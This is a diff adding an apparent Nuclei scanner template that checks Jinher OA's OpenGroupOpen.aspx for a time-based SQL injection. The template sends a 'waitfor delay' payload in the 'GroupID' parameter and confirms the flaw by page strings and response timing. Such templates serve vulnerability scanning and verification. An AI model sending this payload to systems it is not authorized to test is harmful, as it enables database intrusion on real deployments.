@@ -1,0 +1,35 @@
+id: poc-yaml-jinher-opengroupopen-aspx-sqli
+info:
+  name: 金和OA OpenGroupOpen.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    金和OA OpenGroupOpen.aspx contains a SQL Injection vulnerability allowing attackers to exploit the 'GroupID' parameter.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1)+2}}'
+
+http:
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.AddMenu/OpenGroupOpen.aspx/?GroupID=1%27)waitfor+delay%270:0:{{t1}}%27--&op=view HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "公开组公开范围状态查看"
+          - "外部系统名称"
+          - "成功标识"
+          - "JHSoft"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
